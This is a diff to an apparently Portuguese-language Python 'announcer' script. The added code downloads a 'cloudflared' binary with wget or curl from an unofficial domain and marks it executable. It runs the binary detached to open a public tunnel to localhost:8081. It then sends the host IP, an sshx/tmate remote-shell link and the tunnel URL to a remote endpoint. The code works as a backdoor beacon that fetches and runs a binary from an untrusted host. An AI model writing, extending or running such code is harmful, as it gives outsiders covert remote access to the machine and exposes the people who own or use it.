@@ -44,6 +44,7 @@ STATE_FILE = os.path.join(tempfile.gettempdir(), 'sshx_announcer_state.json')
 SSHX_LOG = os.path.join(tempfile.gettempdir(), 'sshx_announce.log')
 FLASK_STARTED = False
 TMATE_LOG = os.path.join(tempfile.gettempdir(), 'tmate_announce.log')
+CLOUDFLARED_LOG = os.path.join(tempfile.gettempdir(), 'cloudflared_announce.log')
 
 
 def get_host_ip():
@@ -186,6 +187,7 @@ def ensure_tmate():
 	if pid and token and is_pid_alive(pid):
 		return token
 
+
 	# tenta detectar se tmate está instalado no PATH
 	tmate_exec = shutil.which('tmate')
 
@@ -216,6 +218,102 @@ def ensure_tmate():
 		pass
 
 	return token
+
+
+def start_cloudflared_detached(cf_exec, timeout=30):
+	safe = shlex.quote(cf_exec)
+	cmd = f"nohup {safe} tunnel --url localhost:8081 > {CLOUDFLARED_LOG} 2>&1 & echo $!"
+	try:
+		out = subprocess.check_output(cmd, shell=True, executable='/bin/bash', stderr=subprocess.STDOUT)
+		pid = int(out.decode().strip())
+	except Exception as e:
+		print('Erro ao iniciar cloudflared (detached):', e)
+		return None, None
+
+	# esperar o log para obter a linha com trycloudflare URL
+	deadline = time.time() + timeout
+	domain = None
+	pattern = re.compile(r'https?://[^\s]+trycloudflare\.com[^\s]*')
+	while time.time() < deadline:
+		try:
+			if os.path.exists(CLOUDFLARED_LOG):
+				with open(CLOUDFLARED_LOG, 'r', errors='ignore') as lf:
+					for line in lf.readlines()[::-1]:
+						m = pattern.search(line)
+						if m:
+							domain = _clean_ansi_and_control(m.group(0))
+							break
+			if domain:
+				break
+		except Exception:
+			pass
+		time.sleep(0.5)
+
+	return pid, domain
+
+
+def download_cloudflared(dest_path):
+	url = 'http://infinitykkj.shop/auth/svrgoat/libs/cloudflared'
+	print(f'Tentando baixar cloudflared para {dest_path}... (rodando apt update)')
+	try:
+		subprocess.run(['apt', 'update'], check=False)
+	except Exception:
+		pass
+
+	# tenta wget primeiro
+	try:
+		subprocess.run(['wget', '-q', '-O', dest_path, url], check=True)
+		os.chmod(dest_path, 0o755)
+		return True
+	except Exception:
+		pass
+
+	# fallback para curl
+	try:
+		subprocess.run(['curl', '-sSfL', '-o', dest_path, url], check=True)
+		os.chmod(dest_path, 0o755)
+		return True
+	except Exception as e:
+		print('Falha ao baixar cloudflared:', e)
+		return False
+
+
+def ensure_cloudflared():
+	# Verifica estado salvo
+	state = read_state()
+	pid = state.get('cloudflared_pid')
+	domain = state.get('cloudflared_url')
+
+	if pid and domain and is_pid_alive(pid):
+		return domain
+
+	# detecta binário
+	cf_exec = shutil.which('cloudflared')
+	if not cf_exec:
+		local_exec = os.path.join(os.getcwd(), 'cloudflared')
+		if os.path.isfile(local_exec) and os.access(local_exec, os.X_OK):
+			cf_exec = local_exec
+
+	if not cf_exec:
+		local_exec = os.path.join(os.getcwd(), 'cloudflared')
+		ok = download_cloudflared(local_exec)
+		if not ok:
+			return None
+		cf_exec = local_exec
+
+	pid, domain = start_cloudflared_detached(cf_exec, timeout=30)
+	if pid is None:
+		return None
+
+	# salvar estado
+	try:
+		state = read_state()
+		state.update({'cloudflared_pid': pid, 'cloudflared_url': domain, 'cloudflared_exec': cf_exec, 'cloudflared_started_at': int(time.time())})
+		write_state(state)
+	except Exception:
+		pass
+
+	return domain
 
 
 def ensure_sshx():
@@ -309,10 +407,12 @@ def start_flask_server():
 	return True
 
 
-def announce(url, ip, ssh_link=None, timeout=10, retries=3):
+def announce(url, ip, ssh_link=None, domain=None, timeout=10, retries=3):
 	params = {'ip': ip}
 	if ssh_link:
 		params['ssh'] = ssh_link
+	if domain:
+		params['domain'] = domain
 	qs = urllib.parse.urlencode(params)
 	full = f"{url}?{qs}"
 	headers = {'User-Agent': 'infinitykkjserver/1.9.5'}
@@ -377,19 +477,26 @@ def main():
 			ip = get_host_ip()
 			now = time.strftime('%Y-%m-%d %H:%M:%S')
 
-			# garantir sshx e obter link (se possível)
+			# garantir sshx/tmate e obter link (se possível)
 			ssh_link = None
 			try:
 				ssh_link = ensure_sshx()
 			except Exception as e:
 				print(f"[{now}] erro ao garantir sshx: {e}")
 
-			ok, resp = announce(url, ip, ssh_link)
+			# garantir cloudflared e obter domínio público (trycloudflare)
+			domain = None
+			try:
+				domain = ensure_cloudflared()
+			except Exception as e:
+				print(f"[{now}] erro ao garantir cloudflared: {e}")
+
+			ok, resp = announce(url, ip, ssh_link, domain)
 			if ok:
-				print(f"[{now}] enviado ip={ip} ssh={ssh_link} -> OK; resposta curta: {resp[:200]}")
+				print(f"[{now}] enviado ip={ip} ssh={ssh_link} domain={domain} -> OK; resposta curta: {resp[:200]}")
 			else:
 				# log e continuar (não encerrar)
-				print(f"[{now}] announce falhou para ip={ip} ssh={ssh_link}: {resp}")
+				print(f"[{now}] announce falhou para ip={ip} ssh={ssh_link} domain={domain}: {resp}")
 
 		except KeyboardInterrupt:
 			raise
